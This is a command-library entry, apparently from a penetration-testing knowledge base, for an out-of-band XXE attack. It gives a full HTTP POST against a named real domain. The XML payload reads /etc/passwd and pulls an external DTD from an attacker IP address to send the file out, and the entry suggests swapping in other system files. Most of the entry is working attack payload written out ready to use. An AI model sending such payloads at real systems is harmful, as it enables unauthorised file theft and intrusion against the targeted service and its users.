---
data: >-
  POST /api/search/GeneralSearch HTTP/1.1

  Content-type: application/xml

  Host: ubermovement.com

  Content-Length: 214

  Connection: Keep-alive

  Accept-Encoding: gzip,deflate

  User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML,
  like Gecko) Chrome/41.0.2228.0 Safari/537.21

  Accept: */*


  <?xml version="1.0" encoding="utf-8"?>

  <!DOCTYPE roottag [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY %
  dtd SYSTEM "http://122.180.248.81/payload.dtd"> %dtd; ]>

  <GeneralSearch>&send;</GeneralSearch>
tags:
  - xxe
  - http-request
type: command
executor: bash
platforms:
  - Web
id: a07c276e-b384-48c4-bba2-fab6ab9dc75a
created_at: '2025-12-13T09:00:28.034Z'
updated_at: '2025-12-13T09:00:28.034Z'
verified: false
validated: true
submitted: true
---
# POST XXE Payload Request

## Command

```http
POST /api/search/GeneralSearch HTTP/1.1
Content-type: application/xml
Host: ubermovement.com
Content-Length: 214
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE roottag [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % dtd SYSTEM "http://122.180.248.81/payload.dtd"> %dtd; ]>
<GeneralSearch>&send;</GeneralSearch>
```

## Description

Sends a POST request with an XXE payload to exploit the vulnerability and attempt to exfiltrate /etc/passwd via an out-of-band request to the attacker's server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Host` | Target domain | Yes |
| `Accept` | Accepted content types | No |
| `Connection` | Keep the connection alive | No |
| `User-Agent` | Browser identification | No |
| `Content-type` | Specifies the request body is XML | Yes |
| `Content-Length` | Length of the request body | Yes |
| `Accept-Encoding` | Accepted encodings | No |

## Examples

### Basic Usage

```http
POST /api/search/GeneralSearch HTTP/1.1
Content-type: application/xml
Host: ubermovement.com
Content-Length: 214

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE roottag [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % dtd SYSTEM "http://122.180.248.81/payload.dtd"> %dtd; ]>
<GeneralSearch>&send;</GeneralSearch>
```

### Advanced Usage

Modify the entity to target different files, e.g., file:///etc/hosts.

## Expected Output

Server processes the XML and makes an out-of-band request, resulting in a 404 error in logs if file not found or ping confirmation.

## Related

- [[commands/xxe-initial-test-payload]]
- [[procedures/Inject-XXE-Payload-and-Verify-Exploitation]]
